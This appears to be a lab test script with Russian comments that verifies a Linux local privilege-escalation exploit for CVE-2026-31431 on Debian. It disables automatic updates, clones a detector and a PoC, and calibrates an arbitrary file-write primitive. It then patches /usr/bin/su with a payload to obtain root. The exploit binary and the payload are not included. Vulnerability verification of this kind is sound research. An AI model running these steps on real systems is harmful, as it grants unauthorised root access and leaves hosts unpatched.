#!/bin/bash
# Полный цикл тестов на cf-debian (аналог ubuntu: этапы B/C/E)
set -u
LOG=~/debian_tests.log
exec > >(tee -a $LOG) 2>&1

echo "==============================================="
echo "=== ТЕСТЫ CVE-2026-31431 на $(hostname), $(date) ==="
echo "==============================================="
echo "--- система:"
cat /etc/os-release | grep PRETTY
uname -r
id
echo "--- B1: отключаю автообновления:"
sudo systemctl disable --now unattended-upgrades 2>/dev/null || true
echo "--- инструменты (NAT-окно):"
sudo apt-get update 2>&1 | tail -1
sudo DEBIAN_FRONTEND=noninteractive apt-get -y install build-essential gcc make strace xxd file binutils python3 git
gcc --version | head -1; strace -V | head -1

echo "--- детектор:"
cd ~
rm -rf copyfail copy-fail-CVE-2026-31431
git clone -q https://github.com/kwilck/copyfail.git && echo "detector cloned"
git clone -q https://github.com/theori-io/copy-fail-CVE-2026-31431.git && echo "poc cloned"
sudo bash ~/copyfail/copyfail.sh 2>&1 | tail -20

echo "--- свой эксплоит:"
mkdir -p ~/exploit
cd ~/exploit
ls
make 2>&1 | tail -1
echo "--- калибровка (несколько смещений):"
for off in 0 4 100 1000 4090; do
  head -c 1200 /dev/urandom > /tmp/d$off; chmod 644 /tmp/d$off
  hex=$(printf "%02x%02x%02x%02x" $((off%251)) $((off%241)) $((off%239)) $((off%233)))
  ./exploit /tmp/d$off $off $hex >/dev/null 2>&1
  found=$(python3 -c "d=open('/tmp/d$off','rb').read(); print(d.find(bytes.fromhex('$hex')))" 2>/dev/null || echo nopy)
  echo "  запрошено $off -> найдено $found"
done

echo "--- стабильность 10 прогонов:"
ok=0
for i in $(seq 1 10); do
  head -c 1200 /dev/urandom > /tmp/s$i; chmod 644 /tmp/s$i
  off=$((RANDOM % 1000))
  hex=$(printf "%02x%02x%02x%02x" $((off%251)) $((off%241)) $((off%239)) $((off%233)))
  ./exploit /tmp/s$i $off $hex >/dev/null 2>&1
  found=$(python3 -c "d=open('/tmp/s$i','rb').read(); print(d.find(bytes.fromhex('$hex')))" 2>/dev/null)
  [ "$found" = "$off" ] && ok=$((ok+1))
done
echo "  F1(debian): успешно $ok/10"

echo "--- полный LPE (патч su мини-ELF):"
md5sum /usr/bin/su
./exploit /usr/bin/su 0 -f payload_su.hex 2>&1 | tail -3
md5sum /usr/bin/su
stat -c "mtime: %y" /usr/bin/su
echo "id; echo ===ROOT_НА_DEBIAN===; exit" | timeout 10 su 2>&1 | head -3

echo "--- контрольные проверки:"
echo "  su: $(ls -la /usr/bin/su | awk '{print $1}')"
echo "=== КОНЕЦ ЦИКЛА ТЕСТОВ ==="
